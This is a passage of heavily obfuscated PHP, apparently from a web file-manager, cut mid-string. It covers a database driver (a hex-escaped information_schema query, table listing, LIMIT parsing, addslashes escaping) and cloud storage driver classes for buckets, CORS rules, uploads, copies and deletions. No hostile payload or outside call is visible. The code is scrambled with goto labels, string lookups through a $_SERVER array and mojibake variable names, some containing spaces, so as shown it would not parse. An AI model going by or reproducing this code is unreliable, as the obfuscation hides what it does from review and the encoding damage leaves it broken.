"\x53\105\x4c\x45\x43\x54\40\x20\x20\x63\x6f\x6c\165\155\x6e\137\x6e\x61\x6d\x65\40\x61\x73\x20\x27\116\141\155\x65\47\54\40\x20\x20\x64\141\x74\x61\137\x74\171\160\x65\x20\x61\x73\40\x27\124\171\160\145\47\x2c\40\40\40\x63\157\x6c\165\155\x6e\x5f\144\145\x66\x61\x75\x6c\x74\x20\x61\163\40\x27\104\145\146\141\165\x6c\x74\47\x2c\x20\x20\x20\151\163\137\x6e\x75\x6c\x6c\141\142\x6c\145\40\x61\x73\x20\x27\116\165\x6c\154\x27\xa\11\x9\x46\122\x4f\115\x9\x69\x6e\x66\x6f\162\x6d\141\164\x69\x6f\156\137\x73\x63\150\145\x6d\x61\56\x74\x61\142\154\145\163\40\x41\x53\x20\164\xa\x9\11\x4a\x4f\x49\116\x9\151\x6e\x66\x6f\162\155\141\164\x69\x6f\156\137\x73\143\x68\x65\x6d\x61\x2e\143\x6f\x6c\x75\x6d\156\x73\40\x41\x53\x20\x63\12\11\x9\117\x4e\x20\40\164\x2e\164\141\142\154\145\x5f\x63\x61\164\x61\154\x6f\x67\40\75\x20\143\56\164\141\142\x6c\x65\137\x63\141\x74\x61\x6c\x6f\147\12\11\x9\101\x4e\104\x20\x74\x2e\x74\141\x62\154\145\x5f\163\x63\x68\x65\155\x61\x20\75\40\x63\56\164\x61\x62\154\x65\x5f\163\143\150\145\155\x61\12\11\x9\101\x4e\x44\40\164\56\164\x61\142\x6c\145\x5f\156\x61\155\145\40\x3d\40\x63\x2e\x74\x61\x62\x6c\x65\x5f\x6e\141\x6d\x65\xa\11\x9\127\110\x45\122\105\40\40\40\x74\56\x74\x61\x62\154\x65\x5f\x6e\x61\155\x65\40\75\x20\x27{$E† ø«ĞÆÁ}\x27"; break; case $BÑó²†ÊÆª[829]: $B¤Ş¿—£Ã÷ = $BÑó²†ÊÆª[830] . $E† ø«ĞÆÁ . $BÑó²†ÊÆª[831]; break; case $BÑó²†ÊÆª[811]: case $BÑó²†ÊÆª[813]: $B¤Ş¿—£Ã÷ = $BÑó²†ÊÆª[832] . $BÑó²†ÊÆª[833] . $BÑó²†ÊÆª[834] . strtoupper($E† ø«ĞÆÁ) . $BÑó²†ÊÆª[835] . strtoupper($E† ø«ĞÆÁ) . $BÑó²†ÊÆª[836]; break; case $BÑó²†ÊÆª[837]: $B¤Ş¿—£Ã÷ = $BÑó²†ÊÆª[838] . $E† ø«ĞÆÁ . $BÑó²†ÊÆª[839]; break; case $BÑó²†ÊÆª[812]: break; case $BÑó²†ÊÆª[840]: default: $B¤Ş¿—£Ã÷ = $BÑó²†ÊÆª[841] . ($this->dbType == $BÑó²†ÊÆª[840] ? "\140{$E† ø«ĞÆÁ}\140" : $E† ø«ĞÆÁ); } } goto Dß£‚ÍÊÁ; C¶Úš‚Š: } public function getTables($a ğÛ¾ë = '') { $a»¶¿¡ù¿œ =& $_SERVER[‘®…¢À]; if (think_config($a»¶¿¡ù¿œ[843])) { $dä“ñãîÆ‰ = str_replace($a»¶¿¡ù¿œ[844], $a ğÛ¾ë, think_config($a»¶¿¡ù¿œ[843])); } else { switch ($this->dbType) { case $a»¶¿¡ù¿œ[811]: case $a»¶¿¡ù¿œ[813]: $dä“ñãîÆ‰ = $a»¶¿¡ù¿œ[845]; break; case $a»¶¿¡ù¿œ[810]: case $a»¶¿¡ù¿œ[828]: $dä“ñãîÆ‰ = $a»¶¿¡ù¿œ[846]; break; case $a»¶¿¡ù¿œ[837]: $dä“ñãîÆ‰ = $a»¶¿¡ù¿œ[847]; break; case $a»¶¿¡ù¿œ[812]: think_exception(think_lang($a»¶¿¡ù¿œ[848]) . $a»¶¿¡ù¿œ[849]); break; case $a»¶¿¡ù¿œ[829]: $dä“ñãîÆ‰ = $a»¶¿¡ù¿œ[42] . $a»¶¿¡ù¿œ[43] . $a»¶¿¡ù¿œ[44]; break; case $a»¶¿¡ù¿œ[840]: default: if (!empty($a ğÛ¾ë)) { $dä“ñãîÆ‰ = $a»¶¿¡ù¿œ[792] . $a ğÛ¾ë; } else { $dä“ñãîÆ‰ = $a»¶¿¡ù¿œ[793]; } } } $AÃàŒæƒ’ò = $this->query($dä“ñãîÆ‰); $B£µÒ©µà = array(); foreach ($AÃàŒæƒ’ò as $d–«Û¯„Â‡ => $EéÆóã¾Ùª) { $B£µÒ©µà[$d–«Û¯„Â‡] = current($EéÆóã¾Ùª); } return $B£µÒ©µà; } protected function parseLimit($AêƒÑç…ß) { $C°»©ßŸ¢§ =& $_SERVER[‘®…¢À]; $A®“¬’¸®ó = $C°»©ßŸ¢§[33]; if (!empty($AêƒÑç…ß)) { switch ($this->dbType) { case $C°»©ßŸ¢§[837]: case $C°»©ßŸ¢§[829]: $AêƒÑç…ß = explode($C°»©ßŸ¢§[47], $AêƒÑç…ß); if (count($AêƒÑç…ß) > 1) { $A®“¬’¸®ó .= $C°»©ßŸ¢§[48] . $AêƒÑç…ß[1] . $C°»©ßŸ¢§[49] . $AêƒÑç…ß[0] . $C°»©ßŸ¢§[50]; } else { $A®“¬’¸®ó .= $C°»©ßŸ¢§[48] . $AêƒÑç…ß[0] . $C°»©ßŸ¢§[50]; } break; case $C°»©ßŸ¢§[810]: case $C°»©ßŸ¢§[828]: break; case $C°»©ßŸ¢§[812]: break; case $C°»©ßŸ¢§[811]: case $C°»©ßŸ¢§[813]: break; case $C°»©ßŸ¢§[840]: default: $A®“¬’¸®ó .= $C°»©ßŸ¢§[48] . $AêƒÑç…ß . $C°»©ßŸ¢§[50]; } } return $A®“¬’¸®ó; } public function parseKey(&$bÃ¯à˜Õ‡, $aÑ¿ÒÇŠ¯Ã = true) { $B»¨¢Ğ šğ =& $_SERVER[‘®…¢À]; if ($aÑ¿ÒÇŠ¯Ã) { $bÃ¯à˜Õ‡ = $this->parseKeyCheck($bÃ¯à˜Õ‡); } if ($this->dbType == $B»¨¢Ğ šğ[840]) { if ($bÃ¯à˜Õ‡ != $B»¨¢Ğ šğ[173] && !preg_match($B»¨¢Ğ šğ[803], $bÃ¯à˜Õ‡)) { $bÃ¯à˜Õ‡ = $B»¨¢Ğ šğ[804] . trim($bÃ¯à˜Õ‡, $B»¨¢Ğ šğ[804]) . $B»¨¢Ğ šğ[804]; } return $bÃ¯à˜Õ‡; } else { return parent::parseKey($bÃ¯à˜Õ‡); } } public function close() { $this->_linkID = null; } public function error() { $AŞÄŠÁ½¼› =& $_SERVER[‘®…¢À]; if ($this->PDOStatement) { $c‚ÂË—àôé = $this->PDOStatement->errorInfo(); $this->error = $c‚ÂË—àôé[1] . $AŞÄŠÁ½¼›[4] . $c‚ÂË—àôé[2]; } else { $this->error = $AŞÄŠÁ½¼›[33]; } if ($AŞÄŠÁ½¼›[33] != $this->queryStr) { $this->error .= LNG($AŞÄŠÁ½¼›[45]) . $this->queryStr; } think_trace($this->error, $AŞÄŠÁ½¼›[33], $AŞÄŠÁ½¼›[46]); return $this->error; } public function escapeString($fÕ´Â¡‰ÜÔ) { $a˜ƒ“âÊï =& $_SERVER[‘®…¢À]; switch ($this->dbType) { case $a˜ƒ“âÊï[837]: case $a˜ƒ“âÊï[810]: case $a˜ƒ“âÊï[828]: case $a˜ƒ“âÊï[840]: return addslashes($fÕ´Â¡‰ÜÔ); case $a˜ƒ“âÊï[812]: case $a˜ƒ“âÊï[829]: case $a˜ƒ“âÊï[811]: case $a˜ƒ“âÊï[813]: return str_ireplace($a˜ƒ“âÊï[55], $a˜ƒ“âÊï[56], $fÕ´Â¡‰ÜÔ); } } protected function parseValue($DØÂÖÔ¡) { $BÀÏ´º…ƒÀ =& $_SERVER[‘®…¢À]; if (is_string($DØÂÖÔ¡)) { $DØÂÖÔ¡ = strpos($DØÂÖÔ¡, $BÀÏ´º…ƒÀ[4]) === 0 ? $this->escapeString($DØÂÖÔ¡) : $BÀÏ´º…ƒÀ[850] . $this->escapeString($DØÂÖÔ¡) . $BÀÏ´º…ƒÀ[850]; } elseif (isset($DØÂÖÔ¡[0]) && is_string($DØÂÖÔ¡[0]) && strtolower($DØÂÖÔ¡[0]) == $BÀÏ´º…ƒÀ[282]) { $DØÂÖÔ¡ = $this->escapeString($DØÂÖÔ¡[1]); } elseif (is_array($DØÂÖÔ¡)) { $DØÂÖÔ¡ = array_map(array($this, $BÀÏ´º…ƒÀ[851]), $DØÂÖÔ¡); } elseif (is_bool($DØÂÖÔ¡)) { $DØÂÖÔ¡ = $DØÂÖÔ¡ ? $BÀÏ´º…ƒÀ[84] : $BÀÏ´º…ƒÀ[463]; } elseif (is_null($DØÂÖÔ¡)) { $DØÂÖÔ¡ = $BÀÏ´º…ƒÀ[102]; } return $DØÂÖÔ¡; } public function getLastInsertId() { $FêÇ Õ­˜Ş =& $_SERVER[‘®…¢À]; switch ($this->dbType) { case $FêÇ Õ­˜Ş[837]: case $FêÇ Õ­˜Ş[829]: case $FêÇ Õ­˜Ş[810]: case $FêÇ Õ­˜Ş[828]: case $FêÇ Õ­˜Ş[812]: case $FêÇ Õ­˜Ş[840]: return $this->_linkID->lastInsertId(); case $FêÇ Õ­˜Ş[811]: case $FêÇ Õ­˜Ş[813]: $AÇ³Ü˜½Áò = $this->table; $D»ò°¥‰Ã‹ = $this->query("\x53\x45\114\x45\103\124\40{$AÇ³Ü˜½Áò}\x2e\x63\x75\162\x72\166\141\x6c\x20\143\165\x72\162\166\141\x6c\40\x46\122\117\x4d\40\x64\x75\141\x6c"); return $D»ò°¥‰Ã‹ ? $D»ò°¥‰Ã‹[0][$FêÇ Õ­˜Ş[852]] : 0; } } } goto aØ¾‚œÓÆ; cƒ¿ì‹·›: class PathDriverNOS extends PathDriverBaseS3 { public $ioUploadServer = "\x31"; public $ioFileOutServer = "\61"; public function __construct($c†¼Êâ´²) { parent::__construct($c†¼Êâ´²); $this->client->setSignatureVersion($_SERVER[‘®…¢À][197]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function setContent($a÷‰×À„†¸, $b’œÜµ¬ = '', $Cæ‹İÂÃ‘ƒ = false) { $D—‚›Ì‚ö› =& $_SERVER[‘®…¢À]; $a÷‰×À„†¸ = $Cæ‹İÂÃ‘ƒ ? trim($a÷‰×À„†¸, $D—‚›Ì‚ö›[8]) . $D—‚›Ì‚ö›[8] : $a÷‰×À„†¸; $CÂèŠïÄ•Œ = get_file_mime(get_path_ext($a÷‰×À„†¸)); $eµİ¢Î•«› = $this->client->putObject($b’œÜµ¬, $this->bucket, $a÷‰×À„†¸, $D—‚›Ì‚ö›[182], array(), $CÂèŠïÄ•Œ); return $eµİ¢Î•«› ? !0 : !1; } public function upload($FâÃñŒÀ’, $aø¹¶á ÆÈ, $bÆÒÅˆé» = false, $A¼ÔÈ´ä× = REPEAT_REPLACE) { $cèËÎéÅµÍ =& $_SERVER[‘®…¢À]; $aâÅÃšÄ† = array(); $AğìÄŠÛ»¶ = array($cèËÎéÅµÍ[196] => get_file_mime(get_path_ext($FâÃñŒÀ’))); if (IO::size($aø¹¶á ÆÈ) <= 1024 * 1024 * 200) { $AØÒòˆÑ = $this->client->putObjectFile($aø¹¶á ÆÈ, $this->bucket, $FâÃñŒÀ’, $cèËÎéÅµÍ[182], $aâÅÃšÄ†, $AğìÄŠÛ»¶); return !empty($AØÒòˆÑ) ? !0 : !1; } $Fğš¾¥Í Ş = $this->client->multiUploadObject($aø¹¶á ÆÈ, $this->bucket, trim($FâÃñŒÀ’, $cèËÎéÅµÍ[8]), $aâÅÃšÄ†, $AğìÄŠÛ»¶); return $Fğš¾¥Í Ş ? $this->getPathOuter($FâÃñŒÀ’) : !1; } public function blockChain($eÒ¥õÃò¶º, $D¦‡¹¼”„) { $AÁ’´¤¸¹ =& $_SERVER[‘®…¢À]; $b‰¹Å¶´Íğ = $this->objectMeta($eÒ¥õÃò¶º); if (!$b‰¹Å¶´Íğ) { return !1; } return $this->client->copyObject($this->bucket, $eÒ¥õÃò¶º, $this->bucket, $eÒ¥õÃò¶º, $AÁ’´¤¸¹[182], array(), $D¦‡¹¼”„, $AÁ’´¤¸¹[1121], !0); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($F¾ä“‡•ÄÌ) { parent::__construct($F¾ä“‡•ÄÌ); $this->signatureVersion($_SERVER[‘®…¢À][197]); } public function fileOutLink($bºÄÌ†é«í) { $f—¾ÚÔéºÉ =& $_SERVER[‘®…¢À]; if (substr($bºÄÌ†é«í, 0, 7) == $f—¾ÚÔéºÉ[1065]) { $bºÄÌ†é«í = $f—¾ÚÔéºÉ[1066] . substr($bºÄÌ†é«í, 7); } header($f—¾ÚÔéºÉ[153] . $bºÄÌ†é«í); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($e‡ÍîÜ×Ó„) { parent::__construct(); include_once SDK_DIR . $_SERVER[‘®…¢À][1122]; $this->_init($e‡ÍîÜ×Ó„); } public function _init($EôÉíÕ¯èä) { foreach ($EôÉíÕ¯èä as $BÇÃÈÀçğ => $D¶ÕãÄ ³) { if (isset($this->{$BÇÃÈÀçğ})) { $this->{$BÇÃÈÀçğ} = $D¶ÕãÄ ³; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[‘®…¢À][1123], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto cè‘Á¼ª; cè‘Á¼ª: $b¶†¼ó¿­Ó =& $_SERVER[‘®…¢À]; $c‡÷©ñáõ = new OSS\Model\CorsConfig(); $B£•Ù‡£öº = new OSS\Model\CorsRule(); goto BÙÑáÁ¾Ä; f‡‚ëöø: $B£•Ù‡£öº->setMaxAgeSeconds(600); $B£•Ù‡£öº->addExposeHeader($b¶†¼ó¿­Ó[1129]); $B£•Ù‡£öº->addAllowedHeader($b¶†¼ó¿­Ó[1124]); goto EÑòƒ’ø; cš¼ç¤íª÷: $B£•Ù‡£öº->addAllowedMethod($b¶†¼ó¿­Ó[1127]); $B£•Ù‡£öº->addAllowedMethod($b¶†¼ó¿­Ó[1128]); $B£•Ù‡£öº->addAllowedMethod($b¶†¼ó¿­Ó[152]); goto f‡‚ëöø; BÙÑáÁ¾Ä: $B£•Ù‡£öº->addAllowedOrigin($b¶†¼ó¿­Ó[1124]); $B£•Ù‡£öº->addAllowedMethod($b¶†¼ó¿­Ó[1125]); $B£•Ù‡£öº->addAllowedMethod($b¶†¼ó¿­Ó[1126]); goto cš¼ç¤íª÷; EÑòƒ’ø: $c‡÷©ñáõ->addRule($B£•Ù‡£öº); try { $this->client->putBucketCors($this->bucket, $c‡÷©ñáõ); } catch (OSS\Core\OssException $cõàø¶¥â«) { return !1; } return !0; goto Fïùï†³°; Fïùï†³°: } public function getBucketCors() { goto e¾†›„ãÑ; d¥éã¦øÏ†: return array($BóñÖÓº—Š[172] => isset($F¦ø¸© †Á[0]) ? $F¦ø¸© †Á[0] : $BóñÖÓº—Š[33], $BóñÖÓº—Š[176] => $AíØßËÎ³Š, $BóñÖÓº—Š[1130] => $BèØ¤ª¿ÖŒ, $BóñÖÓº—Š[1131] => isset($b¾ÊÙìÇµ¥[0]) ? $b¾ÊÙìÇµ¥[0] : $BóñÖÓº—Š[33], $BóñÖÓº—Š[174] => isset($cÒâÕª½ñ[0]) ? $cÒâÕª½ñ[0] : $BóñÖÓº—Š[33]); goto FÖ£“¡Æš¢; eğÚàƒô: $BèØ¤ª¿ÖŒ = $aÚ×ÀÎÎ‰ä[0]->getMaxAgeSeconds(); $b¾ÊÙìÇµ¥ = $aÚ×ÀÎÎ‰ä[0]->getExposeHeaders(); $cÒâÕª½ñ = $aÚ×ÀÎÎ‰ä[0]->getAllowedHeaders(); goto d¥éã¦øÏ†; eÖï÷–‹: if (!$C±ºŞ‹ŠŞí || !($aÚ×ÀÎÎ‰ä = $C±ºŞ‹ŠŞí->getRules())) { return null; } $F¦ø¸© †Á = $aÚ×ÀÎÎ‰ä[0]->getAllowedOrigins(); $AíØßËÎ³Š = $aÚ×ÀÎÎ‰ä[0]->getAllowedMethods(); goto eğÚàƒô; e¾†›„ãÑ: $BóñÖÓº—Š =& $_SERVER[‘®…¢À]; $C±ºŞ‹ŠŞí = null; try { $C±ºŞ‹ŠŞí = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $fÎÌƒğ‹Å) { return null; } goto eÖï÷–‹; FÖ£“¡Æš¢: } public function isBucketCors() { goto B“‘«•‹å§; E¡ßÃ•ƒÜ: if ($AöÆ‹Ê¼“[$F†íêŠî¦—[172]] != $F†íêŠî¦—[173] || $AöÆ‹Ê¼“[$F†íêŠî¦—[174]] != $F†íêŠî¦—[173]) { return !1; } $fÎ¢ø«Çæß = array_map($F†íêŠî¦—[175], $AöÆ‹Ê¼“[$F†íêŠî¦—[176]]); if (!is_array($fÎ¢ø«Çæß)) { $fÎ¢ø«Çæß = array(); } goto bĞğ¹õÉ ‹; bĞğ¹õÉ ‹: $D ö©ÎÙâ¢ = array($F†íêŠî¦—[177], $F†íêŠî¦—[178], $F†íêŠî¦—[179], $F†íêŠî¦—[180], $F†íêŠî¦—[181]); $añ‰Áªåºé = array_diff($D ö©ÎÙâ¢, $fÎ¢ø«Çæß); return empty($añ‰Áªåºé); goto E‰¾áà†; B“‘«•‹å§: $F†íêŠî¦— =& $_SERVER[‘®…¢À]; $AöÆ‹Ê¼“ = $this->getBucketCors(); if (!$AöÆ‹Ê¼“ || !is_array($AöÆ‹Ê¼“)) { return !1; } goto E¡ßÃ•ƒÜ; E‰¾áà†: } public function mkfile($f¼Š£Ô¬‚Ö, $eÖŞì­õÙá = '', $DŒùÕ¥Î’Ù = REPEAT_RENAME) { $dšÃñÓÜÈ‘ = $this->setContent($f¼Š£Ô¬‚Ö, $eÖŞì­õÙá); if ($dšÃñÓÜÈ‘ !== !1) { return $this->getPathOuter($f¼Š£Ô¬‚Ö); } return !1; } public function mkdir($Bíœ‹ÂÕ’œ, $c¢²Ï¢§ùÜ = REPEAT_SKIP) { if ($this->_isFolder($Bíœ‹ÂÕ’œ)) { return $this->getPathOuter($Bíœ‹ÂÕ’œ); } try { $this->client->createObjectDir($this->bucket, $Bíœ‹ÂÕ’œ); } catch (OSS\Core\OssException $AíÍîãâˆ·) { return !1; } return $this->getPathOuter($Bíœ‹ÂÕ’œ); } private function fileList($eÜ‰áøİì–, $aŞßƒ†Õ‰ = '', $A²º×¢Óëµ = 0) { goto c•“ƒ³ê¤; B†ÊÎƒøÅÕ: while (!0) { $d‡¯•ôŠÇõ = array($e‰‘‚Ôˆ›¿[1132] => $aŞßƒ†Õ‰, $e‰‘‚Ôˆ›¿[183] => $f±ë¬¹¸¼‰, $e‰‘‚Ôˆ›¿[1133] => $c„†ï·×Â‘, $e‰‘‚Ôˆ›¿[1134] => $fÆÒº‰êÉÃ); try { $A»†­Şã” = $this->client->listObjects($this->bucket, $d‡¯•ôŠÇõ); } catch (OSS\Core\OssException $B©º‚Íä) { break; } $fÆÒº‰êÉÃ = $A»†­Şã”->getNextMarker(); $C§”®Ê“¾ = $A»†­Şã”->getObjectList(); $c¢¸ÁàÇ„Í = $A»†­Şã”->getPrefixList(); foreach ($C§”®Ê“¾ as $dÛµâÒ’å) { if ($dÛµâÒ’å->getKey() == $f±ë¬¹¸¼‰) { continue; } $bçÇ¬‹Ö†ƒ = $dÛµâÒ’å->getKey(); if ($A²º×¢Óëµ) { $bçÇ¬‹Ö†ƒ = array($e‰‘‚Ôˆ›¿[28] => $bçÇ¬‹Ö†ƒ, $e‰‘‚Ôˆ›¿[78] => $dÛµâÒ’å->getSize(), $e‰‘‚Ôˆ›¿[187] => strtotime($dÛµâÒ’å->getLastModified())); } $C˜‹±µÔŸ«[] = $bçÇ¬‹Ö†ƒ; } foreach ($c¢¸ÁàÇ„Í as $AÜğˆ‹‹ç) { $D‚Ó™ğÈê¢[] = $AÜğˆ‹‹ç->getPrefix(); } if ($fÆÒº‰êÉÃ === $e‰‘‚Ôˆ›¿[33]) { break; } } return array($e‰‘‚Ôˆ›¿[75] => $D‚Ó™ğÈê¢, $e‰‘‚Ôˆ›¿[74] => $C˜‹±µÔŸ«); goto cªÏ’Æ¢¾Ÿ; c•“ƒ³ê¤: $e‰‘‚Ôˆ›¿ =& $_SERVER[‘®…¢À]; $eÜ‰áøİì– = trim($eÜ‰áøİì–, $e‰‘‚Ôˆ›¿[8]); $f±ë¬¹¸¼‰ = empty($eÜ‰áøİì–) ? $e‰‘‚Ôˆ›¿[33] : $eÜ‰áøİì– . $e‰‘‚Ôˆ›¿[8]; goto B½æÔë; B½æÔë: $fÆÒº‰êÉÃ = $e‰‘‚Ôˆ›¿[33]; $c„†ï·×Â‘ = 1000; $D‚Ó™ğÈê¢ = $C˜‹±µÔŸ« = array(); goto B†ÊÎƒøÅÕ; cªÏ’Æ¢¾Ÿ: } public function copyFile($d’ Ü…³ùñ, $fæìïÏ³İÔ) { $e¾ÎŸ­¨ĞÈ = $this->size($d’ Ü…³ùñ); if ($e¾ÎŸ­¨ĞÈ < 1024 * 1024 * 1024) { try { $AÃ³Í„…ÂÔ = $this->client->copyObject($this->bucket, $d’ Ü…³ùñ, $this->bucket, $fæìïÏ³İÔ); } catch (OSS\Core\OssException $cÛ¬åêµ¸Ÿ) { return !1; } return !0; } return $this->multiCopyObject($d’ Ü…³ùñ, $fæìïÏ³İÔ, $e¾ÎŸ­¨ĞÈ); } private function multiCopyObject($dÑô´ø¹ó¯, $dØ‚­Ï¼ÏÔ, $B„ºíÅñ’é) { $f¼»¯²›¬ =& $_SERVER[‘®…¢À]; try { goto dÚÂÒÏ½êŞ; aäâ±Å’ÒŸ: $e‡®’ŞË„ = array(); foreach ($a”µ¬ğ´ˆå as $aøâƒ°³Óß => $EÜ¢ÅÇôÛ) { $e‡®’ŞË„[] = array($f¼»¯²›¬[1139] => $aøâƒ°³Óß + 1, $f¼»¯²›¬[1140] => $EÜ¢ÅÇôÛ); } $E×‰©’Äà” = $this->client->completeMultipartUpload($this->bucket, $dØ‚­Ï¼ÏÔ, $bÁ‹ñ¥ğ«Ø, $e‡®’ŞË„); goto FÎµä‰¨á±; D„Ù‘¬¹˜: $AÌ­µ›í„ = $this->osChunkSize(); $bäªâ‚¦Ñ = $this->client->generateMultiuploadParts($B„ºíÅñ’é, $AÌ­µ›í„); foreach ($bäªâ‚¦Ñ as $aøâƒ°³Óß => $D”Èà¹ï«ƒ) { $b•ôˆÉ”Ø  = $AÇ¸àµéôÎ + (int) $D”Èà¹ï«ƒ[$f¼»¯²›¬[1136]]; $eÜÑëİÎ‰• = (int) $D”Èà¹ï«ƒ[$f¼»¯²›¬[322]] + $b•ôˆÉ”Ø  - 1; $f¼¥æË¤÷Ê = array($f¼»¯²›¬[1137] => $b•ôˆÉ”Ø , $f¼»¯²›¬[1138] => $eÜÑëİÎ‰•); $a”µ¬ğ´ˆå[] = $this->client->uploadPartCopy($this->bucket, $dÑô´ø¹ó¯, $this->bucket, $dØ‚­Ï¼ÏÔ, $D‰âäİõï, $bÁ‹ñ¥ğ«Ø, $f¼¥æË¤÷Ê); $D‰âäİõï = $D‰âäİõï + 1; } goto aäâ±Å’ÒŸ; dÚÂÒÏ½êŞ: $e–¬›§‚ = array(); if ($eŠè••‘Ú = $this->hashMd5($dÑô´ø¹ó¯)) { $e–¬›§‚ = array(OSS\OssClient::OSS_HEADERS => array($f¼»¯²›¬[1135] => $eŠè••‘Ú)); } $bÁ‹ñ¥ğ«Ø = $this->client->initiateMultipartUpload($this->bucket, $dØ‚­Ï¼ÏÔ, $e–¬›§‚); goto cÒ’±‚¢Œ; cÒ’±‚¢Œ: $D‰âäİõï = 1; $AÇ¸àµéôÎ = 0; $a”µ¬ğ´ˆå = array(); goto D„Ù‘¬¹˜; FÎµä‰¨á±: } catch (OSS\Core\OssException $F‹Ï½¬—ø¸) { return !1; } return !0; } public function moveFile($a¥èñæÇ¶Ë, $d”šßË±íø) { if ($this->copyFile($a¥èñæÇ¶Ë, $d”šßË±íø)) { $this->remove($a¥èñæÇ¶Ë); return !0; } return !1; } public function delFile($AÜ…âèÊ ) { try { $this->client->deleteObject($this->bucket, $AÜ…âèÊ ); } catch (OSS\Core\OssException $Fö“ËÅ¡Ú) { return !1; } return !0; } public function delFolder($Eã±»ÛÛ–Á) { $D‡¦ ‘å“ã =& $_SERVER[‘®…¢À]; $eÇˆÂ½íÄ³ = $this->fileList($Eã±»ÛÛ–Á); if (!empty($Eã±»ÛÛ–Á) && !in_array(trim($Eã±»ÛÛ–Á, $D‡¦ ‘å“ã[8]) . $D‡¦ ‘å“ã[8], $eÇˆÂ½íÄ³[$D‡¦ ‘å“ã[74]])) { $eÇˆÂ½íÄ³[$D‡¦ ‘å“ã[74]][] = trim($Eã±»ÛÛ–Á, $D‡¦ ‘å“ã[8]) . $D‡¦ ‘å“ã[8]; } foreach (array_chunk($eÇˆÂ½íÄ³[$D‡¦ ‘å“ã[74]], 1000) as $e¸²Ø½Î—Ü) { try { $this->client->deleteObjects($this->bucket, $e¸²Ø½Î—Ü); } catch (OSS\Core\OssException $cìóîÒ¥Ÿâ) { continue; } } return !0; } public function rename($bìòŠšÑÓŠ, $d İœšî‡) { return $this->renameObject($bìòŠšÑÓŠ, $d İœšî‡); } private function fileInfo($D­‚ß´ß–À, $F‰›ËÀßæ = array()) { goto e„é¸ßÌì¢; F©§Ğçè•Ú: return $féÚ†µ¾»; goto cÏë ÷®Ş™; e„é¸ßÌì¢: $bÊ»»Å¥¢” =& $_SERVER[‘®…¢À]; $féÚ†µ¾» = array($bÊ»»Å¥¢”[28] => $this->pathThis($D­‚ß´ß–À), $bÊ»»Å¥¢”[76] => $this->getPathOuter($D­‚ß´ß–À), $bÊ»»Å¥¢”[29] => $bÊ»»Å¥¢”[164], $bÊ»»Å¥¢”[184] => 0, $bÊ»»Å¥¢”[108] => 0, $bÊ»»Å¥¢”[78] => 0, $bÊ»»Å¥¢”[157] => $this->ext($D­‚ß´ß–À), $bÊ»»Å¥¢”[185] => !0, $bÊ»»Å¥¢”[186] => !0); if (empty($F‰›ËÀßæ)) { $a Ë†¯• · = $this->objectMeta($D­‚ß´ß–À); if (!$a Ë†¯• ·) { return $féÚ†µ¾»; } $F‰›ËÀßæ = array($bÊ»»Å¥¢”[108] => strtotime($a Ë†¯• ·[$bÊ»»Å¥¢”[1141]]), $bÊ»»Å¥¢”[78] => $a Ë†¯• ·[$bÊ»»Å¥¢”[1142]] + 0); } goto Fµ„‘È½”µ; Fµ„‘È½”µ: if (isset($F‰›ËÀßæ[$bÊ»»Å¥¢”[78]])) { $féÚ†µ¾»[$bÊ»»Å¥¢”[78]] = $F‰›ËÀßæ[$bÊ»»Å¥¢”[78]]; } if (isset($F‰›ËÀßæ[$bÊ»»Å¥¢”[108]])) { $féÚ†µ¾»[$bÊ»»Å¥¢”[108]] = $F‰›ËÀßæ[$bÊ»»Å¥¢”[108]]; } if (isset($F‰›ËÀßæ[$bÊ»»Å¥¢”[187]]) && !trim($féÚ†µ¾»[$bÊ»»Å¥¢”[108]])) { $féÚ†µ¾»[$bÊ»»Å¥¢”[108]] = $F‰›ËÀßæ[$bÊ»»Å¥¢”[187]]; } goto F©§Ğçè•Ú; cÏë ÷®Ş™: } private function folderInfo($C¶ñŠß‚æ…, $eÕÒƒ˜ˆ„“ = array()) { $Aä³­¬Æ½ =& $_SERVER[‘®…¢À]; $C®“­Ô‹É© = array($Aä³­¬Æ½[28] => $this->pathThis($C¶ñŠß‚æ…), $Aä³­¬Æ½[76] => $this->getPathOuter($Aä³­¬Æ½[8] . $C¶ñŠß‚æ…), $Aä³­¬Æ½[29] => $Aä³­¬Æ½[77], $Aä³­¬Æ½[184] => 0, $Aä³­¬Æ½[108] => 0, $Aä³­¬Æ½[185] => !0, $Aä³­¬Æ½[186] => !0); if (empty($eÕÒƒ˜ˆ„“)) { $C¶ñŠß‚æ… = rtrim($C¶ñŠß‚æ…, $Aä³­¬Æ½[8]) . $Aä³­¬Æ½[8]; $eÒÉÇ°¥è‰ = $this->objectMeta($C¶ñŠß‚æ…); if (!$eÒÉÇ°¥è‰) { return $C®“­Ô‹É©; } $eÕÒƒ˜ˆ„“ = array($Aä³­¬Æ½[184] => $eÒÉÇ°¥è‰[$Aä³­¬Æ½[1143]][$Aä³­¬Æ½[1144]], $Aä³­¬Æ½[108] => strtotime($eÒÉÇ°¥è‰[$Aä³­¬Æ½[1141]])); } if (isset($eÕÒƒ˜ˆ„“[$Aä³­¬Æ½[108]])) { $C®“­Ô‹É©[$Aä³­¬Æ½[108]] = $eÕÒƒ˜ˆ„“[$Aä³­¬Æ½[108]]; } if (isset($eÕÒƒ˜ˆ„“[$Aä³­¬Æ½[184]])) { $C®“­Ô‹É©[$Aä³­¬Æ½[184]] = $eÕÒƒ˜ˆ„“[$Aä³­¬Æ½[184]]; } return $C®“­Ô‹É©; } public function listPath($E—¶Š®¨ˆô, $DÏßá®Á¥† = false) { $bĞÅŒÀï™ =& $_SERVER[‘®…¢À]; $dÓÎˆÛÒ‡Ú = $this->fileList($E—¶Š®¨ˆô, $bĞÅŒÀï™[8], !0); foreach ($dÓÎˆÛÒ‡Ú[$bĞÅŒÀï™[75]] as $cä„“Ò™é– => $Aƒ¤„öŒÁ) { $dÓÎˆÛÒ‡Ú[$bĞÅŒÀï™[75]][$cä„“Ò™é–] = $this->folderInfo($Aƒ¤„öŒÁ, $Aƒ¤„öŒÁ); } foreach ($dÓÎˆÛÒ‡Ú[$bĞÅŒÀï™[74]] as 